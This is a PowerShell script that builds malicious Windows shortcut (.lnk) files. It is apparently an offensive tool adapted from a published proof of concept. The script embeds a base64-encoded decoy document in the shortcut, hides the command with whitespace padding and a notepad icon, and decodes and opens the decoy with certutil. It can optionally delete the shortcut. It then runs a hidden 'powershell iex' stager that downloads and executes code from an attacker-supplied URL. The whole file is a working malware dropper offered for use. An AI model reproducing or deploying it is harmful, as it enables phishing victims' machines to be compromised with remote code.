<#
.SYNOPSIS
    
    a file to link tools,refer Python PoC from https://www.phrozen.io/2018/06/shortcuts-as-entry-points-for-malware-part-3/

    Author: @red_conv
    
    if you want your own payload, please re-design $stager
    

.PARAMETER 
-inFile
File to encode inside the shortcut.

-outFile
Output the shortcut file.

-stagerUrl
input the powershell stager url to download.

-store
if true, delete the lnk file after open it.

    
.EXAMPLE
    C:\PS> PS c:\Users\abc\Desktop\testlnk> .\file2lnk.ps1 -inFile c:\Users\abc\Desktop\testlnk\test.doc -outFile c:\Users\abc\Desktop\testlnk\test.lnk -StagerUrl http://x.x.x.x/update 
#>

[CmdletBinding()]
Param(
	[Parameter(Position = 0)]
	[String]
	$inFile=$(throw "Parameter missing: -inFile: File to encode inside the shortcut.") ,

    [Parameter(Position = 1)]
	[String]
	$outFile=$(throw "-outFile: Output shortcut file."),

    [Parameter(Position = 2)]
    [string]
    $stagerUrl=$(throw "input the powershell stager url to crack it!"),

    [Switch]
    $stroe = $false
)


Set-StrictMode -Version 2

# Encode payload in base64
$bytes = [System.IO.File]::ReadAllBytes($inFile)
$encoded_payload = [Convert]::ToBase64String($bytes)

# Define shortcut command for payload extraction
$flag = $encoded_payload.Substring(0,32)

$shortcut_basename = [System.IO.Path]::GetFileName($outFile)
$payload_basename = [System.IO.Path]::GetFileName($inFile)

$encoded_file = "%TEMP%\" + [System.IO.path]::GetFileNameWithoutExtension($payload_basename)
$decode_file = "%TEMP%\" + $payload_basename

$melt = ""

if($stroe) {$melt = " & del " + $shortcut_basename;}

$padding = '                                                                                                                                                                                                                                                         '
$stager = "powershell -nop -w hidden -c `"iex ((new-object net.webclient).Downloadstring('$stagerUrl'))`""
$command = 'findstr "' + $flag + '" ' + $shortcut_basename + '>' + $encoded_file + ' & certutil -decode ' + $encoded_file + ' ' + $decode_file + ' & start ' + $decode_file + $melt +' & ' +$stager +' & exit'
Write-Host $command

# Create Shortcuts
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($outFile)
$Shortcut.Description = "PoC of this test"
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = ""  #important, must be empty (Same location as shortcut)
$Shortcut.TargetPath = "%COMSPEC%"
$Shortcut.Arguments =  $padding + '/k "' + $command + '"'
$Shortcut.IconLocation = "%SystemRoot%\System32\notepad.exe"
$Shortcut.Save()

# Finally append payload to generated shortcut
$final_payload = "`n" + $encoded_payload
Add-Content -Path $outFile -Value $final_payload